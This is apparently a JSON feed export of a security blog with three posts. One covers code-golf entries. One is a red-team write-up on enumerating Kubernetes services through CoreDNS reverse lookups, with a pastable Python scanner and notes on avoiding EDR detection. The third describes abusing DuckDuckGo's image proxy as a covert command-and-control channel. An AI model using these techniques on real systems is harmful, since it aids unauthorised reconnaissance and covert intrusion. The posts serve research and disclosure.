{
    "version": "https://jsonfeed.org/version/1",
    "title": "nopcorn",
    "home_page_url": "http://localhost:4000/",
    "feed_url": "http://localhost:4000/feed.json",
    "description": "thoughts and ramblings of an offensive security engineer",
    "icon": "http://localhost:4000/apple-touch-icon.png",
    "favicon": "http://localhost:4000/favicon.ico",
    "expired": false,
    
"items": [
    
        {
            "id": "http://localhost:4000/2024/07/10/bggp4-winning-entries",
            "title": "My Binary Golf Grand Prix 4 (BGGP4) Winning Entries",
            "summary": "A cheeky interpretation of the rules allowed me to win the python and shell challenges",
            "content_text": "      The Binary Golf Grand Prix (BGGP) is a yearly code golf challenge    I won the python and shell categories of BGGP4 by cheekily interpreting the rulesÂ ðŸ‘‘  The Binary Golf Grand Prix (BGGP) is an annual competition that began in 2020, challenging participants to create the smallest possible binary files that perform specific tasks. Organized by @netspooky, the event builds on the concept of code golf, focusing on the creation of minimal executable binaries across various formats and architectures.Participation in BGGP has grown steadily, with numerous entries each year showcasing innovative techniques and deep technical knowledge. The event has become a highlight in the niche community of binary golf enthusiasts, blending creativity with technical prowess. In 2023, BGGP4 opened up entries to non-binary formats which allowed many more people to participate.The Binary Golf Grand Prix 4 (BGGP4) had specific rules that challenged participants to create the smallest executable files that could replicate themselves with an additional few constraints:  The file must print or return the string 4  The replica it creates must be called 4  It must not execute its replicaI decided to try my hand at the python and shell categories.Python (42 bytes)My python entry relied on a few common tricks such as loading all objects in the shutil module using the * symbol (fun fact: the space after import is optional). This gives us access to the copy() function, which only takes up 4 bytes. We then use the builtin __file__ variable as the first argument and the string '4' as the name of the destination file.from shutil import*copy(__file__,'4');4/0Finally we get to the cheeky ace up my sleeve in order to get python to print 4 to stdout. The rules just stated 4 needed to be printed, it didnâ€™t state that other output couldnâ€™t accompany it. The shortest way I found of producing this sort of output is to try dividing 4 by 0, which will cause a ZeroDivisionError exception and terminate the script. I got confirmation from the organizers of the competition that this was within the spirit of the rules.Bash (10 bytes)Armed with a technical workaround for one of the rules, I tried the shell category. Most of the other competitors were using cp to move the script and echo to print out the number 4. I found that if you give cp the verbose flag, it will happily tell you the names of the files it is operating on - which prints out 4.cp -v $0 4Reviewing the other entries I noticed an efficiency which would have saved me a single byte. @caioluders submitted an 11 byte entry using * in place of $0 which selects all files in the current directory (see globbing). Had they also used the verbose flag, they would have won!BGGP4 was a fun way to spend a few hours - big props to @netspooky and the rest of the team!",
            "content_html": "<blockquote>  <ul>    <li>The Binary Golf Grand Prix (BGGP) is a yearly code golf challenge</li>    <li>I won the <code>python</code> and <code>shell</code> categories of BGGP4 by cheekily interpreting the rulesÂ ðŸ‘‘</li>  </ul></blockquote><p>The Binary Golf Grand Prix (BGGP) is an annual competition that began in 2020, challenging participants to create the smallest possible binary files that perform specific tasks. Organized by <a href=\"https://x.com/netspooky\">@netspooky</a>, the event builds on the concept of code golf, focusing on the creation of minimal executable binaries across various formats and architectures.</p><p>Participation in BGGP has grown steadily, with numerous entries each year showcasing innovative techniques and deep technical knowledge. The event has become a highlight in the niche community of binary golf enthusiasts, blending creativity with technical prowess. In 2023, BGGP4 opened up entries to non-binary formats which allowed many more people to participate.</p><p>The <a href=\"https://binary.golf/4/\">Binary Golf Grand Prix 4</a> (BGGP4) had specific rules that challenged participants to create the smallest executable files that could replicate themselves with an additional few constraints:</p><ul>  <li>The file must print or return the string <code>4</code></li>  <li>The replica it creates must be called <code>4</code></li>  <li>It must not execute its replica</li></ul><p>I decided to try my hand at the <code>python</code> and <code>shell</code> categories.</p><h2 id=\"python-42-bytes\">Python (42 bytes)</h2><p>My <code>python</code> entry relied on a few common tricks such as loading all objects in the <code>shutil</code> module using the <code>*</code> symbol (fun fact: the space after <code>import</code> is optional). This gives us access to the <code>copy()</code> function, which only takes up 4 bytes. We then use the builtin <code>__file__</code> variable as the first argument and the string <code>'4'</code> as the name of the destination file.</p><pre><code class=\"language-python\">from shutil import*copy(__file__,'4');4/0</code></pre><p>Finally we get to the cheeky ace up my sleeve in order to get python to print <code>4</code> to stdout. The rules just stated <code>4</code> needed to be printed, it didnâ€™t state that <em>other</em> output couldnâ€™t accompany it. The shortest way I found of producing this sort of output is to try dividing 4 by 0, which will cause a <code>ZeroDivisionError</code> exception and terminate the script. I got <a href=\"https://infosec.exchange/@const/110986639752255684\">confirmation from the organizers</a> of the competition that this was within the spirit of the rules.</p><h2 id=\"bash-10-bytes\">Bash (10 bytes)</h2><p>Armed with a technical workaround for one of the rules, I tried the <code>shell</code> category. Most of the other competitors were using <code>cp</code> to move the script and <code>echo</code> to print out the number 4. I found that if you give <code>cp</code> the verbose flag, it will happily tell you the names of the files it is operating on - which prints out <code>4</code>.</p><pre><code class=\"language-bash\">cp -v $0 4</code></pre><p>Reviewing the other entries I noticed an efficiency which would have saved me a single byte. <a href=\"https://twitter.com/caioluders/\">@caioluders</a> submitted an 11 byte entry using <code>*</code> in place of <code>$0</code> which selects all files in the current directory (see <a href=\"https://tldp.org/LDP/abs/html/globbingref.html\">globbing</a>). Had they also used the verbose flag, they would have won!</p><p><strong>BGGP4 was a fun way to spend a few hours - big props to @netspooky and the rest of the team!</strong></p><p><img src=\"/assets/img/happy-cat.jpg\" alt=\"\" /></p>",
            "url": "http://localhost:4000/2024/07/10/bggp4-winning-entries",
            
            
            
            "tags": ["bggp4","challenge","python","bash"],
            
            "date_published": "2024-07-10T00:00:00-04:00",
            "date_modified": "2024-07-10T00:00:00-04:00",
            
                "author": "nopcorn"
            
        },
    
        {
            "id": "http://localhost:4000/2024/07/08/kubernetes-service-discovery",
            "title": "Service Discovery in Kubernetes with Restrictive Permissions",
            "summary": "When operating in a kubernetes environment without permissions allowing you to list pods and services, there are other options for getting the lay of the land",
            "content_text": "      Most Kubernetes clusters running CoreDNS support reverse DNS lookups by default    Listing pods and services in a cluster is considered a privileged action, protected by the list verb on the services and namespace resources    Bruteforcing the clusterâ€™s IP space via reverse DNS lookups will reveal services available in the cluster    This allows for some light privilege escalation â„¢  In a recent red team engagement, I encountered a curious scenario while navigating a Kubernetes cluster. After exploiting a vulnerability in an ephemeral pod and deploying a customized version of the Poseidon agent, I turned to lateral movement and privilege escalation. Generally, I start with the stored API creds already available in the pod located in /var/run/secrets/kubernetes.io/serviceaccount/token to see what I can access.$ curl -L \"https://dl.k8s.io/release/v1.30.2/bin/linux/amd64/kubectl\" -o /tmp/kubectl$ chmod +x /tmp/kubectl$ /tmp/kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) auth can-i --listResources                                       Non-Resource URLs                      Resource Names   Verbsselfsubjectreviews.authentication.k8s.io        []                                     []               [create]selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]                                                [/.well-known/openid-configuration/]   []               [get]                                                [/.well-known/openid-configuration]    []               [get]                                                [/api/*]                               []               [get]                                                [/api]                                 []               [get]                                                [/apis/*]                              []               [get]                                                [/apis]                                []               [get]                                                [/healthz]                             []               [get]                                                [/healthz]                             []               [get]                                                [/livez]                               []               [get]                                                [/livez]                               []               [get]                                                [/openapi/*]                           []               [get]                                                [/openapi]                             []               [get]                                                [/openid/v1/jwks/]                     []               [get]                                                [/openid/v1/jwks]                      []               [get]                                                [/readyz]                              []               [get]                                                [/readyz]                              []               [get]                                                [/version/]                            []               [get]                                                [/version/]                            []               [get]                                                [/version]                             []               [get]                                                [/version]                             []               [get]In this case - I couldnâ€™t access anything. This effectively rendered the Kubernetes API useless for further exploration unless I found a new token to try out. I turned to classic old-school lateral movement and host discovery.I knew a SentinelOne agent was present on the hypervisor so fast network-based host discovery via nmap or zmap would be much too noisy and risk giving away the attacker advantage so early in the engagement. I thought about writing a quick and dirty python scanner with generous sleeping in between hosts, but after discovering I was in a /16 I didnâ€™t have the patience to sit through slowly working by way through 65000 potential live IPs. Additionally, I could identify a live IP but due to how Kubernetes clusters are managed that IP could be reassigned or abandoned at any time if a new deployment or load balancing was performed.Instead I looked for quieter ways of identifying services and pods that wouldnâ€™t be as scrutinized by security products and audit logs, but allowed me to progress somewhat quickly. I decided to take a look at how CoreDNS worked as there was likely less visibility on DNS queries and resolutions within a cluster.In Kubernetes, DNS is used by pods to identify other services available in the cluster as IPs change frequently. Every service in Kubernetes is provisioned an entry in the clusterâ€™s DNS that corresponds to its service name and the namespace that itâ€™s in:The only namespace I knew of was the one I was currently in (found in /run/secrets/kubernetes.io/serviceaccount/namespace). I debated generating a wordlist of common namespace and service names but decided against bruteforcing.From previously listing network interfaces, I knew that I was in a /16 network and could iterate through the IP addresses performing reverse lookups if CoreDNS automatically inserted PRT records or if it resolved the in-addr.arpa domain name.As it so happens, this is a feature of CoreDNS which is enabled by default. The in-addr.arpa domain being present allows for the server to automatically resolve our reverse lookups.I wrote a quick and dirty pastable python script that will read an IP range in CIDR notation from the environment and try a reverse resolution for each IP:import socketimport ipaddressimport oscidr = os.environ.get('cidr')net = ipaddress.ip_network(cidr)for ip in net:    name = socket.getnameinfo((str(ip), 0), 0)[0]    try:        ipaddress.ip_address(name)    except ValueError:        print(f'{name} -&gt; {ip}') Collapsing this script into a one liner and running it through python looks something like this:$ cidr=\"172.20.0.0/16\" python3 -c \"exec(\\\"import socket\\nimport ipaddress\\nimport os\\n\\ncidr = os.environ.get('cidr')\\nnet = ipaddress.ip_network(cidr)\\n\\nfor ip in net:\\n\\tname = socket.getnameinfo((str(ip), 0), 0)[0]\\n\\ttry:\\n\\t\\tipaddress.ip_address(name)\\n\\texcept ValueError:\\n\\t\\tprint(f'{name} -&gt; {ip}')\\\")\" | grep -v \"compute\"I had to grep out the non-service responses or else every IP address would return a default AWS resolution like ip-172-20-0-7.us-east-1.compute.internal.Letting this script run for a bit gave me a complete list of services in the cluster and their currently associated IP addresses. Additionally, because the namespace a service is hosted in appears in the domain name for it, I get a partial list of valid namespaces in the cluster. This essentially allows an unprivileged token to give itself the list verb on the services and namespaces resources, even if they have been explicitly denied.Armed with a list of valid services in the network I could now pivot to software identification and port scanning.",
            "content_html": "<blockquote>  <ul>    <li>Most Kubernetes clusters running CoreDNS support reverse DNS lookups by default</li>    <li>Listing pods and services in a cluster is considered a privileged action, protected by the <code>list</code> verb on the <code>services</code> and <code>namespace</code> resources</li>    <li>Bruteforcing the clusterâ€™s IP space via reverse DNS lookups will reveal services available in the cluster</li>    <li>This allows for some light privilege escalation â„¢</li>  </ul></blockquote><p>In a recent red team engagement, I encountered a curious scenario while navigating a Kubernetes cluster. After exploiting a vulnerability in an ephemeral pod and deploying a customized version of the <a href=\"https://github.com/MythicAgents/poseidon\">Poseidon</a> agent, I turned to lateral movement and privilege escalation. Generally, I start with the stored API creds already available in the pod located in <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code> to see what I can access.</p><pre><code class=\"language-hack-nowrap\">$ curl -L \"https://dl.k8s.io/release/v1.30.2/bin/linux/amd64/kubectl\" -o /tmp/kubectl$ chmod +x /tmp/kubectl$ /tmp/kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) auth can-i --listResources                                       Non-Resource URLs                      Resource Names   Verbsselfsubjectreviews.authentication.k8s.io        []                                     []               [create]selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]                                                [/.well-known/openid-configuration/]   []               [get]                                                [/.well-known/openid-configuration]    []               [get]                                                [/api/*]                               []               [get]                                                [/api]                                 []               [get]                                                [/apis/*]                              []               [get]                                                [/apis]                                []               [get]                                                [/healthz]                             []               [get]                                                [/healthz]                             []               [get]                                                [/livez]                               []               [get]                                                [/livez]                               []               [get]                                                [/openapi/*]                           []               [get]                                                [/openapi]                             []               [get]                                                [/openid/v1/jwks/]                     []               [get]                                                [/openid/v1/jwks]                      []               [get]                                                [/readyz]                              []               [get]                                                [/readyz]                              []               [get]                                                [/version/]                            []               [get]                                                [/version/]                            []               [get]                                                [/version]                             []               [get]                                                [/version]                             []               [get]</code></pre><p>In this case - I couldnâ€™t access anything. This effectively rendered the Kubernetes API useless for further exploration unless I found a new token to try out. I turned to classic old-school lateral movement and host discovery.</p><p>I knew a SentinelOne agent was present on the hypervisor so fast network-based host discovery via <code>nmap</code> or <code>zmap</code> would be much too noisy and risk giving away the attacker advantage so early in the engagement. I thought about writing a quick and dirty python scanner with generous sleeping in between hosts, but after discovering I was in a <code>/16</code> I didnâ€™t have the patience to sit through slowly working by way through 65000 potential live IPs. Additionally, I could identify a live IP but due to how Kubernetes clusters are managed that IP could be reassigned or abandoned at any time if a new deployment or load balancing was performed.</p><p>Instead I looked for quieter ways of identifying services and pods that wouldnâ€™t be as scrutinized by security products and audit logs, but allowed me to progress somewhat quickly. I decided to take a look at how CoreDNS worked as there was likely less visibility on DNS queries and resolutions within a cluster.</p><p>In Kubernetes, DNS is used by pods to identify other services available in the cluster as IPs change frequently. Every service in Kubernetes is provisioned an entry in the clusterâ€™s DNS that corresponds to its service name and the namespace that itâ€™s in:</p><p><img src=\"/assets/img/k8s-dns-structure.png\" alt=\"\" /></p><p>The only namespace I knew of was the one I was currently in (found in <code>/run/secrets/kubernetes.io/serviceaccount/namespace</code>). I debated generating a wordlist of common namespace and service names but decided against bruteforcing.</p><p>From previously listing network interfaces, I knew that I was in a <code>/16</code> network and could iterate through the IP addresses performing <a href=\"https://en.wikipedia.org/wiki/Reverse_DNS_lookup\">reverse lookups</a> if CoreDNS automatically inserted PRT records or if it resolved the <code>in-addr.arpa</code> domain name.</p><p>As it so happens, this is a <a href=\"https://kubernetes.io/docs/tasks/administer-cluster/dns-custom-nameservers/#coredns\">feature of CoreDNS which is enabled by default</a>. The <code>in-addr.arpa</code> domain being present allows for the server to automatically resolve our reverse lookups.</p><p>I wrote a quick and dirty pastable python script that will read an IP range in CIDR notation from the environment and try a reverse resolution for each IP:</p><pre><code class=\"language-python\">import socketimport ipaddressimport oscidr = os.environ.get('cidr')net = ipaddress.ip_network(cidr)for ip in net:    name = socket.getnameinfo((str(ip), 0), 0)[0]    try:        ipaddress.ip_address(name)    except ValueError:        print(f'{name} -&gt; {ip}') </code></pre><p>Collapsing this script into a one liner and running it through python looks something like this:</p><pre><code class=\"language-shell\">$ cidr=\"172.20.0.0/16\" python3 -c \"exec(\\\"import socket\\nimport ipaddress\\nimport os\\n\\ncidr = os.environ.get('cidr')\\nnet = ipaddress.ip_network(cidr)\\n\\nfor ip in net:\\n\\tname = socket.getnameinfo((str(ip), 0), 0)[0]\\n\\ttry:\\n\\t\\tipaddress.ip_address(name)\\n\\texcept ValueError:\\n\\t\\tprint(f'{name} -&gt; {ip}')\\\")\" | grep -v \"compute\"</code></pre><p>I had to grep out the non-service responses or else every IP address would return a default AWS resolution like <code>ip-172-20-0-7.us-east-1.compute.internal</code>.</p><p>Letting this script run for a bit gave me a complete list of services in the cluster and their currently associated IP addresses. Additionally, because the namespace a service is hosted in appears in the domain name for it, I get a partial list of valid namespaces in the cluster. <strong>This essentially allows an unprivileged token to give itself the <code>list</code> verb on the <code>services</code> and <code>namespaces</code> resources, even if they have been explicitly denied</strong>.</p><p>Armed with a list of valid services in the network I could now pivot to software identification and port scanning.</p>",
            "url": "http://localhost:4000/2024/07/08/kubernetes-service-discovery",
            
            
            
            "tags": ["kubernetes","eks","k8s","tradecraft","discovery"],
            
            "date_published": "2024-07-08T00:00:00-04:00",
            "date_modified": "2024-07-08T00:00:00-04:00",
            
                "author": "nopcorn"
            
        },
    
        {
            "id": "http://localhost:4000/2023/09/25/duckduckgo-as-c2",
            "title": "Using DuckDuckGo's Image Proxy as a C2 Channel",
            "summary": "DuckDuckGo's image preview APIs put way too much trust in the user and don't validate that the requests came from authentic browsing behavior.",
            "content_text": "      DuckDuckGoâ€™s image proxy doesnâ€™t allow-list trusted URLs, so anyone can request any image through it.    The proxy doesnâ€™t sanitize the URI, allowing for any number of request parameters to be relayed to the server hosting the image.    This can be leveraged by a malicious actor to covertly communicate with a compromised server using an image-based protocol.    Small proof of concept provided: DuckDuckC2  DuckDuckGo (DDG) is a search engine known for its emphasis on user privacy. Unlike many other search engines, it doesnâ€™t track usersâ€™ search history, ensuring a more private online search experience. With its user-friendly interface and commitment to not collecting or sharing personal information, it has garnered a dedicated user base among privacy-conscious individuals.Expected BehaviorConducting an image search via DuckDuckGo results in many requests to the external-content subdomain:This endpoint seems to accept a url as parameter u and returns and image. From some of the research Iâ€™ve been conducting on image proxies, I know this domain as Bingâ€™s own image proxy (tse.mm.bing.net and tse.explicit.bing.net). Itâ€™s not surprising that DuckDuckGo would be leveraging Bingâ€™s services as they source traditional links and images in their search results from the company. Scrolling down through multiple pages of image search always shows the same domains being supplied in the u parameter.I assumed the external-content proxy would only be allow-listing *.bing.net domains and decided it would be interesting to try and confuse the regular expression that was underpinning this function by registering custom domains with bing substrings. Keeping things simple though, I first tested for the presence of the allow-listing by generating a webhook on my testing server and providing it to the proxyâ€¦..and it happily tried to pull the image ðŸ¤¦Probing the APITo my surprise, DuckDuckGo happily accepted the webhook and requested it to receive content. I guess they arenâ€™t allow-listing domains. The request my server received looked like this - curiously, the IP it came from doesnâ€™t appear in DuckDuckGoâ€™s list of DuckDuckBot IPs, despite providing the DuckDuckBot/1.1 user-agent:GET /notanimage HTTP/1.1Host: &lt;MYSERVER&gt;Accept: */*connection: closeaccept-encoding: gzipuser-agent: DuckDuckBot/1.1; (+http://duckduckgo.com/duckduckbot.html)Probing the /iu endpoint a bit more, I discovered that DuckDuckGo returns a HTTP/2 400 error if the content isnâ€™t understood by the proxy (aka it isnâ€™t an image in a valid format - likely based on Content-Type headers). Alternative HTTP verbs like POST and PUT get automatically converted by DuckDuckGoâ€™s servers to a GET for the same endpoint. We know the server software is likely nginx based on the banner, so itâ€™s possible the location block for the /iu endpoint looks something like this:location @force_get {    proxy_method GET;    proxy_pass_request_headers off;    proxy_pass http://ourupstream;}The proxy does pass request parameters to the server hosting the image. I fuzzed the maximum parameter size and it doesnâ€™t seem like DuckDuckGo is performing any filtering on content or length. This means that the only limit is from the web servers and clients doing the proxying. I was able to relay 8192 bytes of data without issue and suspect that number isnâ€™t the ceiling. Additionally, it seems like multiple DuckDuckGo subdomains support the /iu proxy service.Using as a C2 ChannelAssuming we control both sides of proxy connection, we can communicate using request parameters and return output via encoded images using the proper Content-Type headers. While this can be leveraged in many ways, hereâ€™s how my proof of concept DuckDuckC2 works:It assumes that server.py is running somewhere where a shell is desired and that client.py needs to communicate with it from reputable IP space (DuckDuckGo). The client can relay tasking for the server via GET parameters and the output the commands are encoded into the image returned as a result. DuckDuckGo happily forwards on the modified image and the client is able to extract the output from it. All of this functionality is wrapped is a pseudo-shell to give the client the impression they are interacting with an actual shell.RemediationWithout internal knowledge of DuckDuckGoâ€™s strategy for image search, itâ€™s difficult to say if this open proxy is a bug or pre-positioning code for integration with future image providers. I would suggest applying an allow-list of domains to the API underpinning this feature - likely something like *.bing.net would suffice as it seems all legitimate use of the proxy simply points to Bing. DuckDuckGo does have many other products though, so itâ€™s possible there are other uses in other codebases.Defending against the use of this technique in a network isnâ€™t too difficult seeing as most web servers will log request parameters. Regardless of the directionality (whether the client or server is in your network), attackers will have to go to great lengths to obfuscate commands and responses from network-aware security solutions.",
            "content_html": "<blockquote>  <ul>    <li>DuckDuckGoâ€™s image proxy doesnâ€™t allow-list trusted URLs, so anyone can request any image through it.</li>    <li>The proxy doesnâ€™t sanitize the URI, allowing for any number of request parameters to be relayed to the server hosting the image.</li>    <li>This can be leveraged by a malicious actor to covertly communicate with a compromised server using an image-based protocol.</li>    <li>Small proof of concept provided: <a href=\"https://github.com/nopcorn/DuckDuckC2\">DuckDuckC2</a></li>  </ul></blockquote><p><a href=\"https://duckduckgo.com\">DuckDuckGo</a> (DDG) is a search engine known for its emphasis on user privacy. Unlike many other search engines, it doesnâ€™t track usersâ€™ search history, ensuring a more private online search experience. With its user-friendly interface and commitment to not collecting or sharing personal information, it has garnered a dedicated user base among privacy-conscious individuals.</p><h1 id=\"expected-behavior\">Expected Behavior</h1><p>Conducting an image search via DuckDuckGo results in many requests to the <code>external-content</code> subdomain:</p><p><img src=\"/assets/img/ddg-image-search-network-loads.png\" alt=\"\" /></p><p>This endpoint seems to accept a url as parameter <code>u</code> and returns and image. From some of the research Iâ€™ve been conducting on image proxies, I know this domain as Bingâ€™s own image proxy (<code>tse.mm.bing.net</code> and <code>tse.explicit.bing.net</code>). Itâ€™s not surprising that DuckDuckGo would be leveraging Bingâ€™s services as they <a href=\"https://duckduckgo.com/duckduckgo-help-pages/results/sources/\">source traditional links and images in their search results from the company</a>. Scrolling down through multiple pages of image search always shows the same domains being supplied in the <code>u</code> parameter.</p><p>I assumed the <code>external-content</code> proxy would only be allow-listing <code>*.bing.net</code> domains and decided it would be interesting to try and confuse the regular expression that was underpinning this function by registering custom domains with <code>bing</code> substrings. Keeping things simple though, I first tested for the presence of the allow-listing by generating a webhook on my testing server and providing it to the proxyâ€¦</p><p>..and it happily tried to pull the image ðŸ¤¦</p><h1 id=\"probing-the-api\">Probing the API</h1><p>To my surprise, DuckDuckGo happily accepted the webhook and requested it to receive content. I guess they arenâ€™t allow-listing domains. The request my server received looked like this - curiously, the IP it came from doesnâ€™t appear in <a href=\"https://duckduckgo.com/duckduckgo-help-pages/results/duckduckbot/\">DuckDuckGoâ€™s list of DuckDuckBot IPs</a>, despite providing the <code>DuckDuckBot/1.1</code> user-agent:</p><pre><code>GET /notanimage HTTP/1.1Host: &lt;MYSERVER&gt;Accept: */*connection: closeaccept-encoding: gzipuser-agent: DuckDuckBot/1.1; (+http://duckduckgo.com/duckduckbot.html)</code></pre><p>Probing the <code>/iu</code> endpoint a bit more, I discovered that DuckDuckGo returns a <code>HTTP/2 400</code> error if the content isnâ€™t understood by the proxy (aka it isnâ€™t an image in a valid format - likely based on <code>Content-Type</code> headers). Alternative HTTP verbs like <code>POST</code> and <code>PUT</code> get automatically converted by DuckDuckGoâ€™s servers to a <code>GET</code> for the same endpoint. We know the server software is likely <code>nginx</code> based on the banner, so itâ€™s possible the location block for the <code>/iu</code> endpoint looks something like this:</p><pre><code>location @force_get {    proxy_method GET;    proxy_pass_request_headers off;    proxy_pass http://ourupstream;}</code></pre><p>The proxy <em>does</em> pass request parameters to the server hosting the image. I fuzzed the maximum parameter size and it doesnâ€™t seem like DuckDuckGo is performing any filtering on content or length. This means that the only limit is from the web servers and clients doing the proxying. I was able to relay 8192 bytes of data without issue and suspect that number isnâ€™t the ceiling. Additionally, it seems like multiple DuckDuckGo subdomains support the <code>/iu</code> proxy service.</p><h1 id=\"using-as-a-c2-channel\">Using as a C2 Channel</h1><p>Assuming we control both sides of proxy connection, we can communicate using request parameters and return output via encoded images using the proper <code>Content-Type</code> headers. While this can be leveraged in many ways, hereâ€™s how my proof of concept <a href=\"https://github.com/nopcorn/DuckDuckC2\">DuckDuckC2</a> works:</p><p><img src=\"/assets/img/duckduckc2-flow.png\" alt=\"\" /></p><p>It assumes that <code>server.py</code> is running somewhere where a shell is desired and that <code>client.py</code> needs to communicate with it from reputable IP space (DuckDuckGo). The client can relay tasking for the server via GET parameters and the output the commands are encoded into the image returned as a result. DuckDuckGo happily forwards on the modified image and the client is able to extract the output from it. All of this functionality is wrapped is a pseudo-shell to give the client the impression they are interacting with an actual shell.</p><h1 id=\"remediation\">Remediation</h1><p>Without internal knowledge of DuckDuckGoâ€™s strategy for image search, itâ€™s difficult to say if this open proxy is a bug or pre-positioning code for integration with future image providers. I would suggest applying an allow-list of domains to the API underpinning this feature - likely something like <code>*.bing.net</code> would suffice as it seems all legitimate use of the proxy simply points to Bing. DuckDuckGo does have many other products though, so itâ€™s possible there are other uses in other codebases.</p><p>Defending against the use of this technique in a network isnâ€™t too difficult seeing as most web servers will log request parameters. Regardless of the directionality (whether the client or server is in your network), attackers will have to go to great lengths to obfuscate commands and responses from network-aware security solutions.</p>",
            "url": "http://localhost:4000/2023/09/25/duckduckgo-as-c2",
            
            
            
            "tags": ["infrastructure","c2","proxy"],
            
            "date_published": "2023-09-25T00:00:00-04:00",
            "date_modified": "2023-09-25T00:00:00-04:00",
            
                "author": "nopcorn"
            
        }
    
    ]
}